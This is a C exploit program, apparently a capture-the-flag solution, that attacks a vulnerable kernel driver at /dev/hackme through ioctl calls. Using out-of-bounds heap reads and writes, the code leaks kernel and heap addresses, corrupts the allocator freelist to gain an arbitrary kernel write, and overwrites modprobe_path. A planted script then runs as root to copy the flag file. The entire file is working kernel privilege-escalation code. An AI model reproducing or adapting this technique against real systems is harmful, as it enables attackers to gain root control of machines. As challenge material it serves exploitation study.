#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

void alloc(int fd,int idx,char *user,long long len){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx){
	struct arg cmd;
	cmd.idx = idx;
	ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,READ,&cmd);	
}
void write_to_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,WRITE,&cmd);	
}

void print_hex( char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}

int main(){
	int fd = open("/dev/hackme", 0);
	char *mem = malloc(0x1000);
	size_t heap_addr , kernel_addr,mod_addr;
	if (fd < 0){
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
	memset(mem,'A',0x100);
	alloc(fd,0,mem,0x100);
	alloc(fd,1,mem,0x100);
	alloc(fd,2,mem,0x100);
	alloc(fd,3,mem,0x100);
	alloc(fd,4,mem,0x100);

	delete(fd,1);
	delete(fd,3);

	read_from_kernel(fd,4,mem,0x100,-0x100);
	heap_addr = *((size_t  *)mem);
	printf("[+] heap addr : %16llx\n",heap_addr );
	read_from_kernel(fd,0,mem,0x200,-0x200);
	kernel_addr = *((size_t  *)(mem+0x28)) ;
	if ((kernel_addr & 0xfff) != 0xae0){
		printf("[-] maybe bad kernel leak : %16llx\n",kernel_addr);
		exit(-1);
	}
		
	kernel_addr -= 0x849ae0; //0x849ae0 - sysctl_table_root
	printf("[+] kernel addr : %16llx\n",kernel_addr );	
	
	memset(mem,'A',0x100);
	*((size_t *)mem) = (0x811000 + kernel_addr + 0x40); // mod_tree +0x40
	write_to_kernel(fd,4,mem,0x100,-0x100);
	alloc(fd,5,mem,0x100);
	alloc(fd,6,mem,0x100);

	read_from_kernel(fd,6,mem,0x40,-0x40);
	mod_addr =  *((size_t  *)(mem+0x18)) ;
	printf("[+] mod addr : %16llx\n",mod_addr );	

	delete(fd,2);
	//delete(fd,4);
	delete(fd,5);

	*((size_t *)mem) = (0x2400 + mod_addr + 0xc0); // mod_tree +0x40
	write_to_kernel(fd,4,mem,0x100,-0x100);
	alloc(fd,7,mem,0x100);
	alloc(fd,8,mem,0x100); // pool
	//*((size_t *)mem) = (0x83f480 + kernel_addr ); //poweroff_cmd
	*((size_t *)(mem+0x8)) = 0x100; 
	*((size_t *)mem) = (0x83f960 + kernel_addr ); //ffffffff8183f960 D modprobe_path
	write_to_kernel(fd,8,mem,0x10,0);

	strncpy(mem,"/home/pwn/copy.sh\0",18);
	write_to_kernel(fd,0xc,mem,18,0);

	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
	system("chmod +x /home/pwn/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
	system("chmod +x /home/pwn/dummy");

	system("/home/pwn/dummy");
	system("cat flag");
}